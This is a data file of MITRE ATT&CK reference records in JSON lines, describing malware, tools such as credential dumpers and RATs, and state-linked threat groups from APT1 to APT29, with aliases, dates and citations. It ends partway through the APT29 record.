{"ID":"S0008","name":"gsecdump","description":"[gsecdump](https://attack.mitre.org/software/S0008) is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. (Citation: TrueSec Gsecdump)","url":"https://attack.mitre.org/software/S0008","created":"31 May 2017","last modified":"22 September 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Symantec Tick Apr 2016),(Citation: Mandiant APT1),(Citation: TrendMicro Tonto Team October 2020),(Citation: Bizeul 2014),(Citation: Dell TG-3390),(Citation: McAfee Night Dragon),(Citation: TrueSec Gsecdump)"}
{"ID":"S0071","name":"hcdLoader","description":"[hcdLoader](https://attack.mitre.org/software/S0071) is a remote access tool (RAT) that has been used by [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral Movement)","url":"https://attack.mitre.org/software/S0071","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Dell Lateral Movement),(Citation: ThreatStream Evasion Analysis),,(Citation: Dell Lateral Movement),(Citation: ThreatStream Evasion Analysis)"}
{"ID":"S0068","name":"httpclient","description":"[httpclient](https://attack.mitre.org/software/S0068) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool. (Citation: CrowdStrike Putter Panda)","url":"https://attack.mitre.org/software/S0068","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Putter Panda),,(Citation: CrowdStrike Putter Panda)"}
{"ID":"S0278","name":"iKitten","description":"[iKitten](https://attack.mitre.org/software/S0278) is a macOS exfiltration agent  (Citation: objsee mac malware 2017).","url":"https://attack.mitre.org/software/S0278","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"macOS","aliases":"OSX/MacDownloader","type":"malware","relationship citations":",,(Citation: objsee mac malware 2017)"}
{"ID":"S0101","name":"ifconfig","description":"[ifconfig](https://attack.mitre.org/software/S0101) is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. (Citation: Wikipedia Ifconfig)","url":"https://attack.mitre.org/software/S0101","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":",,"}
{"ID":"S0100","name":"ipconfig","description":"[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)","url":"https://attack.mitre.org/software/S0100","created":"31 May 2017","last modified":"12 October 2022","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Group IB APT 41 June 2021),(Citation: FireEye admin@338),(Citation: DFIR Phosphorus November 2021),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: Mandiant APT1),(Citation: ClearSky Siamesekitten August 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: Palo Alto OilRig May 2016),(Citation: Symantec Orangeworm April 2018),(Citation: CISA SoreFang July 2016),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),"}
{"ID":"S0283","name":"jRAT","description":"[jRAT](https://attack.mitre.org/software/S0283) is a cross-platform, Java-based backdoor originally available for purchase in 2012. Variants of [jRAT](https://attack.mitre.org/software/S0283) have been distributed via a software-as-a-service platform, similar to an online subscription model.(Citation: Kaspersky Adwind Feb 2016) (Citation: jRAT Symantec Aug 2018)","url":"https://attack.mitre.org/software/S0283","created":"17 October 2018","last modified":"25 January 2021","version":"2.1","contributors":null,"platforms":"Android, Linux, Windows, macOS","aliases":"Adwind, AlienSpy, Frutas, JSocket, Sockrat, Trojan.Maljava, Unrecom, jBiFrost, jFrutas","type":"malware","relationship citations":",,(Citation: Kaspersky Adwind Feb 2016),(Citation: Symantec Frutas Feb 2013),(Citation: jRAT Symantec Aug 2018)"}
{"ID":"S1048","name":"macOS.OSAMiner","description":"[macOS.OSAMiner](https://attack.mitre.org/software/S1048) is a Monero mining trojan that was first observed in 2018; security researchers assessed [macOS.OSAMiner](https://attack.mitre.org/software/S1048) may have been circulating since at least 2015. [macOS.OSAMiner](https://attack.mitre.org/software/S1048) is known for embedding one run-only AppleScript into another, which helped the malware evade full analysis for five years due to a lack of Apple event (AEVT) analysis tools.(Citation: SentinelLabs reversing run-only applescripts 2021)(Citation: VMRay OSAMiner dynamic analysis 2021)","url":"https://attack.mitre.org/software/S1048","created":"04 October 2022","last modified":"19 October 2022","version":"1.0","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: SentinelLabs reversing run-only applescripts 2021)"}
{"ID":"S0175","name":"meek","description":"[meek](https://attack.mitre.org/software/S0175) is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.","url":"https://attack.mitre.org/software/S0175","created":"16 January 2018","last modified":"09 February 2021","version":"1.0","contributors":null,"platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: Mandiant No Easy Breach),,"}
{"ID":"S1059","name":"metaMain","description":"[metaMain](https://attack.mitre.org/software/S1059) is a backdoor used by [Metador](https://attack.mitre.org/groups/G1013) to maintain long-term access to compromised machines; it has also been used to decrypt [Mafalda](https://attack.mitre.org/software/S1060) into memory.(Citation: SentinelLabs Metador Sept 2022)(Citation: SentinelLabs Metador Technical Appendix Sept 2022)","url":"https://attack.mitre.org/software/S1059","created":"24 January 2023","last modified":"05 April 2023","version":"1.0","contributors":"Massimiliano Romano, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022),,(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022)"}
{"ID":"S0102","name":"nbtstat","description":"[nbtstat](https://attack.mitre.org/software/S0102) is a utility used to troubleshoot NetBIOS name resolution. (Citation: TechNet Nbtstat)","url":"https://attack.mitre.org/software/S0102","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Kaspersky Turla),,"}
{"ID":"S0108","name":"netsh","description":"[netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact with networking components on local or remote systems. (Citation: TechNet Netsh)","url":"https://attack.mitre.org/software/S0108","created":"31 May 2017","last modified":"17 January 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":"netsh.exe","type":"tool","relationship citations":"(Citation: US-CERT TA18-074A),(Citation: Group-IB Anunak),(Citation: Baumgartner Naikon 2015),(Citation: Novetta Blockbuster Loaders),(Citation: Cybereason Cobalt Kitty 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Costa AvosLocker May 2022),(Citation: Demaske Netsh Persistence),(Citation: TechNet Netsh),(Citation: Securelist fileless attacks Feb 2017),(Citation: TechNet Netsh Firewall)"}
{"ID":"S0104","name":"netstat","description":"[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)","url":"https://attack.mitre.org/software/S0104","created":"31 May 2017","last modified":"12 October 2022","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: FireEye admin@338),(Citation: Kaspersky Turla),(Citation: Kaspersky Lyceum October 2021),(Citation: Palo Alto OilRig May 2016),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Orangeworm April 2018),(Citation: FireEye APT41 Aug 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FireEye APT34 Dec 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FoxIT Wocao December 2019),(Citation: TechNet Netstat)"}
{"ID":"S0385","name":"njRAT","description":"[njRAT](https://attack.mitre.org/software/S0385) is a remote access tool (RAT) that was first observed in 2012. It has been used by threat actors in the Middle East.(Citation: Fidelis njRAT June 2013)","url":"https://attack.mitre.org/software/S0385","created":"04 June 2019","last modified":"16 September 2022","version":"1.4","contributors":null,"platforms":"Windows","aliases":"Bladabindi, LV, Njw0rm","type":"malware","relationship citations":"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Citizen Lab Group5),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: FireEye APT41 Aug 2019),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Fidelis njRAT June 2013),(Citation: Citizen Lab Group5),(Citation: Trend Micro njRAT 2018)"}
{"ID":"S0067","name":"pngdowner","description":"[pngdowner](https://attack.mitre.org/software/S0067) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple \"download-and-\nexecute\" utility. (Citation: CrowdStrike Putter Panda)","url":"https://attack.mitre.org/software/S0067","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Putter Panda),,(Citation: CrowdStrike Putter Panda)"}
{"ID":"S0006","name":"pwdump","description":"[pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: Wikipedia pwdump)","url":"https://attack.mitre.org/software/S0006","created":"31 May 2017","last modified":"13 August 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Mandiant APT1),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Symantec Chafer February 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: PWC Cloud Hopper Technical Annex April 2017),,(Citation: Wikipedia pwdump)"}
{"ID":"S0103","name":"route","description":"[route](https://attack.mitre.org/software/S0103) can be used to find or change information within the local system IP routing table. (Citation: TechNet Route)","url":"https://attack.mitre.org/software/S0103","created":"31 May 2017","last modified":"06 April 2022","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Symantec Orangeworm April 2018),,"}
{"ID":"S0111","name":"schtasks","description":"[schtasks](https://attack.mitre.org/software/S0111) is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. (Citation: TechNet Schtasks)","url":"https://attack.mitre.org/software/S0111","created":"31 May 2017","last modified":"20 April 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":"schtasks.exe","type":"tool","relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: KISA Operation Muzabi),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye Operation Double Tap),,(Citation: TechNet Schtasks)"}
{"ID":"S0227","name":"spwebmember","description":"[spwebmember](https://attack.mitre.org/software/S0227) is a Microsoft SharePoint enumeration and data dumping tool written in .NET. (Citation: NCC Group APT15 Alive and Strong)","url":"https://attack.mitre.org/software/S0227","created":"18 April 2018","last modified":"29 March 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: NCC Group APT15 Alive and Strong),,(Citation: NCC Group APT15 Alive and Strong)"}
{"ID":"S0225","name":"sqlmap","description":"[sqlmap](https://attack.mitre.org/software/S0225) is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. (Citation: sqlmap Introduction)","url":"https://attack.mitre.org/software/S0225","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Check Point Rocket Kitten),,(Citation: sqlmap Introduction)"}
{"ID":"S0653","name":"xCaon","description":"[xCaon](https://attack.mitre.org/software/S0653) is an HTTP variant of the [BoxCaon](https://attack.mitre.org/software/S0651) malware family that has used by [IndigoZebra](https://attack.mitre.org/groups/G0136) since at least 2014. [xCaon](https://attack.mitre.org/software/S0653) has been used to target political entities in Central Asia, including Kyrgyzstan and Uzbekistan.(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)","url":"https://attack.mitre.org/software/S0653","created":"29 September 2021","last modified":"16 October 2021","version":"1.0","contributors":"Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Yoshihiro Kori, NEC Corporation","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Checkpoint IndigoZebra July 2021),,(Citation: Checkpoint IndigoZebra July 2021)"}
{"ID":"S0123","name":"xCmd","description":"[xCmd](https://attack.mitre.org/software/S0123) is an open source tool that is similar to [PsExec](https://attack.mitre.org/software/S0029) and allows the user to execute applications on remote systems. (Citation: xCmd)","url":"https://attack.mitre.org/software/S0123","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Mandiant APT1 Appendix),,(Citation: xCmd)"}
{"ID":"S0248","name":"yty","description":"[yty](https://attack.mitre.org/software/S0248) is a modular, plugin-based malware framework. The components of the framework are written in a variety of programming languages. (Citation: ASERT Donot March 2018)","url":"https://attack.mitre.org/software/S0248","created":"17 October 2018","last modified":"28 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ASERT Donot March 2018)"}
{"ID":"S0350","name":"zwShell","description":"[zwShell](https://attack.mitre.org/software/S0350) is a remote access tool (RAT) written in Delphi that has been seen in the wild since the spring of 2010 and used by threat actors during [Night Dragon](https://attack.mitre.org/campaigns/C0002).(Citation: McAfee Night Dragon)","url":"https://attack.mitre.org/software/S0350","created":"30 January 2019","last modified":"22 September 2022","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: McAfee Night Dragon),(Citation: McAfee Night Dragon)"}
{"ID":"G0099","name":"APT-C-36","description":"[APT-C-36](https://attack.mitre.org/groups/G0099) is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.(Citation: QiAnXin APT-C-36 Feb2019)","url":"https://attack.mitre.org/groups/G0099","created":"05 May 2020","last modified":"26 May 2021","version":"1.1","contributors":"Jose Luis Sánchez Martinez","associated groups":"Blind Eagle","associated groups citations":"(Citation: QiAnXin APT-C-36 Feb2019)","relationship citations":"(Citation: QiAnXin APT-C-36 Feb2019),(Citation: QiAnXin APT-C-36 Feb2019),"}
{"ID":"G0006","name":"APT1","description":"[APT1](https://attack.mitre.org/groups/G0006) is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/groups/G0006","created":"31 May 2017","last modified":"26 May 2021","version":"1.4","contributors":null,"associated groups":"Comment Crew, Comment Group, Comment Panda","associated groups citations":"(Citation: Mandiant APT1), (Citation: Mandiant APT1), (Citation: CrowdStrike Putter Panda)","relationship citations":"(Citation: Mandiant APT1 Appendix),(Citation: Mandiant APT1),(Citation: McAfee Oceansalt Oct 2018),(Citation: Mandiant APT1 Appendix),(Citation: FireEye PLA),(Citation: Mandiant APT1),"}
{"ID":"G0005","name":"APT12","description":"[APT12](https://attack.mitre.org/groups/G0005) is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.(Citation: Meyers Numbered Panda)","url":"https://attack.mitre.org/groups/G0005","created":"31 May 2017","last modified":"30 March 2020","version":"2.1","contributors":null,"associated groups":"DNSCALC, DynCalc, IXESHE, Numbered Panda","associated groups citations":"(Citation: Moran 2014), (Citation: Meyers Numbered Panda) (Citation: Moran 2014), (Citation: Meyers Numbered Panda) (Citation: Moran 2014), (Citation: Meyers Numbered Panda)","relationship citations":"(Citation: Trend Micro IXESHE 2012),(Citation: Moran 2014),(Citation: Moran 2013),(Citation: Meyers Numbered Panda),(Citation: Moran 2014),(Citation: Trend Micro IXESHE 2012),"}
{"ID":"G0023","name":"APT16","description":"[APT16](https://attack.mitre.org/groups/G0023) is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. (Citation: FireEye EPS Awakens Part 2)","url":"https://attack.mitre.org/groups/G0023","created":"31 May 2017","last modified":"26 July 2022","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: FireEye EPS Awakens Part 2),(Citation: FireEye EPS Awakens Part 2),"}
{"ID":"G0025","name":"APT17","description":"[APT17](https://attack.mitre.org/groups/G0025) is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. (Citation: FireEye APT17)","url":"https://attack.mitre.org/groups/G0025","created":"31 May 2017","last modified":"13 October 2020","version":"1.1","contributors":null,"associated groups":"Deputy Dog","associated groups citations":"(Citation: FireEye APT17)","relationship citations":"(Citation: FireEye APT17),(Citation: FireEye APT17),"}
{"ID":"G0026","name":"APT18","description":"[APT18](https://attack.mitre.org/groups/G0026) is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. (Citation: Dell Lateral Movement)","url":"https://attack.mitre.org/groups/G0026","created":"31 May 2017","last modified":"30 March 2020","version":"2.1","contributors":null,"associated groups":"Dynamite Panda, TG-0416, Threat Group-0416","associated groups citations":"(Citation: ThreatStream Evasion Analysis)(Citation: Anomali Evasive Maneuvers July 2015), (Citation: ThreatStream Evasion Analysis)(Citation: Anomali Evasive Maneuvers July 2015), (Citation: ThreatStream Evasion Analysis)","relationship citations":"(Citation: RSA2017 Detect and Respond Adair),(Citation: Dell Lateral Movement),(Citation: Palo Alto DNS Requests),(Citation: ThreatStream Evasion Analysis),(Citation: RSA2017 Detect and Respond Adair),(Citation: Dell Lateral Movement),(Citation: PaloAlto DNS Requests May 2016),(Citation: Anomali Evasive Maneuvers July 2015),"}
{"ID":"G0073","name":"APT19","description":"[APT19](https://attack.mitre.org/groups/G0073) is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms. (Citation: FireEye APT19) Some analysts track [APT19](https://attack.mitre.org/groups/G0073) and [Deep Panda](https://attack.mitre.org/groups/G0009) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016) (Citation: FireEye APT Groups) (Citation: Unit 42 C0d0so0 Jan 2016)","url":"https://attack.mitre.org/groups/G0073","created":"17 October 2018","last modified":"21 March 2023","version":"1.5","contributors":"Darren Spruell; FS-ISAC","associated groups":"C0d0so0, Codoso, Codoso Team, Sunshop Group","associated groups citations":"(Citation: Unit 42 C0d0so0 Jan 2016), (Citation: Unit 42 C0d0so0 Jan 2016), (Citation: FireEye APT Groups), (Citation: Dark Reading Codoso Feb 2015)","relationship citations":"(Citation: NCSC Joint Report Public Tools),(Citation: FireEye APT19),(Citation: NCSC Joint Report Public Tools),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: FireEye APT19),"}
{"ID":"G0007","name":"APT28","description":"[APT28](https://attack.mitre.org/groups/G0007) is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) This group has been active since at least 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy May 2019)\n\n[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election. (Citation: Crowdstrike DNC June 2016) In 2018, the US indicted five GRU Unit 26165 officers associated with [APT28](https://attack.mitre.org/groups/G0007) for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.(Citation: US District Court Indictment GRU Oct 2018) Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as [Sandworm Team](https://attack.mitre.org/groups/G0034). ","url":"https://attack.mitre.org/groups/G0007","created":"31 May 2017","last modified":"26 March 2023","version":"4.0","contributors":"Drew Church, Splunk; Emily Ratliff, IBM; Richard Gold, Digital Shadows; Sébastien Ruel, CGI","associated groups":"Fancy Bear, Group 74, IRON TWILIGHT, Pawn Storm, SNAKEMACKEREL, STRONTIUM, Sednit, Sofacy, Swallowtail, TG-4127, Threat Group-4127, Tsar Team","associated groups citations":"(Citation: Crowdstrike DNC June 2016)(Citation: Kaspersky Sofacy)(Citation: ESET Sednit Part 3)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Talos Seduploader Oct 2017)(Citation: Symantec APT28 Oct 2018)(Citation: Securelist Sofacy Feb 2018)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021), (Citation: Talos Seduploader Oct 2017), (Citation: Secureworks IRON TWILIGHT Profile)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017), (Citation: SecureWorks TG-4127)(Citation: ESET Sednit Part 3)(Citation: TrendMicro Pawn Storm Dec 2020) , (Citation: Accenture SNAKEMACKEREL Nov 2018), (Citation: Kaspersky Sofacy)(Citation: ESET Sednit Part 3)(Citation: Microsoft STRONTIUM Aug 2019)(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020)(Citation: TrendMicro Pawn Storm Dec 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021), This designation has been used in reporting both to refer to the threat group and its associated malware [JHUHUGIT](https://attack.mitre.org/software/S0044).(Citation: FireEye APT28 January 2017)(Citation: SecureWorks TG-4127)(Citation: Kaspersky Sofacy)(Citation: Ars Technica GRU indictment Jul 2018), This designation has been used in reporting both to refer to the threat group and its associated malware.(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: Crowdstrike DNC June 2016)(Citation: ESET Sednit Part 3)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Talos Seduploader Oct 2017), (Citation: Symantec APT28 Oct 2018), (Citation: SecureWorks TG-4127), (Citation: SecureWorks TG-4127), (Citation: ESET Sednit Part 3)(Citation: Talos Seduploader Oct 2017)(Citation: Talos Seduploader Oct 2017)","relationship citations":"(Citation: XAgentOSX 2017),(Citation: Überwachung APT28 Forfiles June 2015),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: ESET Sednit Part 3),(Citation: Palo Alto Sofacy 06-2018),(Citation: ESET LoJax Sept 2018),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 Sofacy Dec 2018),(Citation: Symantec APT28 Oct 2018),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Crowdstrike DNC June 2016),(Citation: Sofacy Komplex Trojan),(Citation: Unit42 Cannon Nov 2018),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: ESET Zebrocy May 2019),(Citation: Sofacy DealersChoice),(Citation: FireEye APT28),(Citation: NSA/FBI Drovorub August 2020),(Citation: FireEye APT28 January 2017),(Citation: Fysbis Palo Alto Analysis),(Citation: Kaspersky Sofacy),(Citation: XAgentOSX 2017),(Citation: Überwachung APT28 Forfiles June 2015),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: ESET Sednit Part 3),(Citation: Palo Alto Office Test Sofacy),(Citation: Trend Micro Pawn Storm April 2017),(Citation: Palo Alto Sofacy 06-2018),(Citation: RSAC 2015 Abu Dhabi Stefano Maccaglia),(Citation: ESET LoJax Sept 2018),(Citation: Unit 42 Playbook Dec 2017),(Citation: ESET Sednit Part 1),(Citation: McAfee APT28 DDE2 Nov 2017),(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 Sofacy Dec 2018),(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020),(Citation: Microsoft Targeting Elections September 2020),(Citation: FireEye Op RussianDoll),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Symantec APT28 Oct 2018),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Microsoft STRONTIUM Aug 2019),(Citation: Talos Seduploader Oct 2017),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Microsoft SIR Vol 19),(Citation: Crowdstrike DNC June 2016),(Citation: Unit42 Cannon Nov 2018),(Citation: US District Court Indictment GRU Oct 2018),(Citation: ESET Zebrocy May 2019),(Citation: Securelist Sofacy Feb 2018),(Citation: ESET Sednit Part 2),(Citation: Bitdefender APT28 Dec 2015),(Citation: Sofacy DealersChoice),(Citation: FireEye APT28),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: MS17-010 March 2017),(Citation: TrendMicro Pawn Storm 2019),(Citation: TrendMicro Pawn Storm Dec 2020),"}
{"ID":"G0016","name":"APT29","description":"[APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR).(Citation: White House Imposing Costs RU Gov April 2021)(Citation: UK Gov Malign RIS Activity April 2021) They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. [APT29](https://attack.mitre.org/groups/G0016) reportedly compromised the Democratic National Committee starting in the summer of 2015.(Citation: F-Secure The Dukes)(Citation: GRIZZLY STEPPE JAR)(Citation: Crowdstrike DNC June 2016)(Citation: UK Gov UK Exposes Russia SolarWinds April 2021)\n\nIn April 2021, the US and UK governments attributed the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) to the SVR; public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021) Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Unit 42 SolarStorm December 2020)","url":"https://attack.mitre.org/groups/G0016","created":"31 May 2017","last modified":"16 April 2023","version":"4.0","contributors":"Daniyal Naeem, BT Security; Joe Gumke, U.S. Bank; Katie Nickels, Red Canary; Matt Brenton, Zurich Insurance Group","associated groups":"Blue Kitsune, Cozy Bear, CozyDuke, Dark Halo, IRON HEMLOCK, IRON RITUAL, NOBELIUM, NobleBaron, SolarStorm, StellarParticle, The Dukes, UNC2452, YTTRIUM","associated groups citations":"(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020), (Citation: Crowdstrike DNC June 2016)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: CrowdStrike StellarParticle January 2022), (Citation: Crowdstrike DNC June 2016), (Citation: Volexity SolarWinds), (Citation: Secureworks IRON HEMLOCK Profile), (Citation: Secureworks IRON RITUAL Profile), (Citation: MSTIC NOBELIUM Mar 2021)(Citation: MSTIC NOBELIUM May 2021)(Citation: MSTIC Nobelium Toolset May 2021)(Citation: MSRC Nobelium June 2021), (Citation: SentinelOne NobleBaron June 2021), (Citation: Unit 42 SolarStorm December 2020), (Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: CrowdStrike StellarParticle January 2022), (Citation: F-Secure The Dukes)(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP May 2021), (Citation: FireEye SUNBURST Backdoor December 2020), (Citation: Microsoft Unidentified Dec 2018)","relationship citations":"(Citation: NCSC APT29 July 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: CISA WellMail July 2020),(Citation: Secureworks IRON RITUAL Profile),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MSTIC NOBELIUM May 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: Mandiant No Easy Breach),(Citation: CISA WellMess July 2020),(Citation: ESET T3 Threat Report 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: CISA SoreFang July 2016),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Symantec RAINDROP January 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: PWC WellMess July 2020),(Citation: MSTIC FoggyWeb September 2021),(Citation: F-Secure The Dukes),(Citation: PWC WellMess C2 August 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye POSHSPY April 2017),(Citation: ESET Dukes October 2019),(Citation: Symantec Seaduke 2015),(Citation: CrowdStrike 